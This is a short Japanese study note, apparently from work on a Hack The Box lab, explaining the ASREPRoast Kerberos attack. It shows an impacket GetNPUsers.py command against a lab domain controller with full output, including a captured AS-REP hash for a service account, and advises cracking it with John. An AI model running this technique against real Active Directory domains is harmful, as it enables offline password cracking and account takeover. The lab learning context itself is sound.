# ASREPRoast
https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast

>ASREPRoast攻撃は、Kerberosの事前認証必須属性(DONT_REQ_PREAUTH)を持たないユーザを探します。
つまり、誰もがそれらのユーザに代わってDCにAS_REQリクエストを送信し、AS_REPメッセージを受け取ることができるということです。
 (Deeplで翻訳)
 
 impacketのGetNPUsers.pyを使用
 
 ```
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py HTB/ -usersfile  users.txt -no-pass -dc-ip 10.10.10.161
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:413: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if domain is '':
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB:8d325b4d99b7ae0ec91248148f61a150$334920a114ddec3e6f1db4b532d9dc45096c7a4481cd36277b3dddc53fd6a77e7bad05c632b6bb88cc3ff131afc082f57c5760953a29e9365c6428dc32ec7412b3856b836b06832d4d0775a2b27859a1c344588e28cc49108019ef35370c82c5e2bf0e08976debf8cf624ea8a5700e3202426b398a3e96de5143a737cad26950723a27e5692d1d7b1ebdf869916ef31969289fa10d673c5a0eaa9c33f95292c690138fe9620a4977ea60d50cda42f87ed9493e4b4171b7201f1228713f377f26306c1b1c217704f98b1e09e3098643236bbf51dd00c94d728883962c7c9bb55e
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
 これで出てきたhashはjojnで頑張って解析
